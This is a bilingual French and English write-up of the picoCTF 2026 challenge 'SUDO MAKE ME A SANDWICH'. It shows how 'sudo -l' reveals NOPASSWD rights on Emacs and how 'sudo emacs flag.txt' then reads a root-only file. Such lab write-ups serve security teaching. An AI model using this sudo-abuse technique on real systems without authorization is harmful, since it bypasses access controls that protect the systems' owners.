# Write-Up : SUDO MAKE ME A SANDWICH

---

## 🇫🇷 Version Française

### 📋 Informations du Challenge

- **Nom du challenge :** SUDO MAKE ME A SANDWICH
- **Plateforme / Événement :** picoCTF 2026
- **Auteur :** Darkraicg492
- **Catégorie :** General Skills
- **Difficulté :** Easy

---

### 📝 Description

_"Can you read the flag? I think you can! ssh -p 31163 ctf-player@chatelaine.cylabacademy.net using password 964909ff"_

---

### 🔍 Étape 1 : Connexion SSH et énumération des privilèges

On se connecte au serveur distant via SSH avec les identifiants fournis :

```bash
ssh -p 31163 ctf-player@chatelaine.cylabacademy.net
```

En tentant de lire le fichier flag.txt, un refus de permission apparaît (Permission denied). On vérifie les droits sudo accordés à l'utilisateur courant en exécutant :

```Bash
sudo -l
```

**Résultat :**

```
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
On constate que l'utilisateur peut exécuter l'éditeur Emacs avec les privilèges root sans saisir de mot de passe (NOPASSWD).
```

### 🛠️ Étape 2 : Élévation de privilèges via Emacs (GTFOBins)

En s'appuyant sur les techniques d'élévation de privilèges (GTFOBins), on sait qu'exécuter un éditeur de texte interactif comme Emacs avec sudo permet de lire n'importe quel fichier système avec les droits d'administration.

On lance Emacs en mode privilégié pour ouvrir directement le fichier restreint :

```Bash
sudo emacs flag.txt
```

### 🚩 Étape 3 : Lecture du Flag

Le fichier flag.txt s'ouvre dans l'interface de l'éditeur Emacs avec les privilèges root, révélant le contenu du flag.

### 💡 Key Takeaways / Notions retenues

- Énumération Sudo (sudo -l) : C'est la première étape indispensable lors d'une phase d'élévation de privilèges (Privilege Escalation) sous Linux pour identifier les binaires exécutables en tant que root.

- GTFOBins & Sudo Abuses : Accorder des privilèges sudo sur des éditeurs de texte (Emacs, Vim, Nano) ou des binaires interactifs permet à un utilisateur non privilégié de contourner les restrictions d'accès aux fichiers protégés.

## 🇬🇧 English Version

### 📋 Challenge Info

- **Challenge Name:** SUDO MAKE ME A SANDWICH
- **Platform / Event:** picoCTF 2026
- **Author:** Darkraicg492
- **Category:** General Skills
- **Difficulty:** Easy

### 📝 Description

_"Can you read the flag? I think you can! ssh -p 31163 ctf-player@chatelaine.cylabacademy.net using password 964909ff"_

### 🔍 Step 1: Remote Access & Sudo Privilege Enumeration

We connect to the remote host via SSH using the provided credentials:

```Bash
ssh -p 31163 ctf-player@chatelaine.cylabacademy.net
```

Attempting to directly read flag.txt results in a Permission denied error. We inspect allowed sudo rules for the current user:

```Bash
sudo -l
```

**Output:**

```
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
The configuration reveals that ctf-player is allowed to execute /bin/emacs as root without requiring a password (NOPASSWD).
```

### 🛠️ Step 2: Privilege Escalation via Emacs (GTFOBins)

Following standard GTFOBins privilege escalation vectors, running text editors with administrative privileges allows reading arbitrary restricted files.

We invoke Emacs with sudo directly targeted at the protected flag file:

```Bash
sudo emacs flag.txt
```

### 🚩 Step 3: Flag Retrieval

Emacs opens flag.txt under root execution context, rendering the flag text visible in the buffer interface.

### 💡 Key Takeaways

- Sudo Privilege Enumeration (sudo -l): A vital initial step in Linux privilege escalation assessment to locate binaries running with elevated permissions.

- GTFOBins Exploitation: Granting sudo rights on interactive utilities or editors (such as Emacs, Vim, or Nano) allows low-privileged users to bypass file access controls.
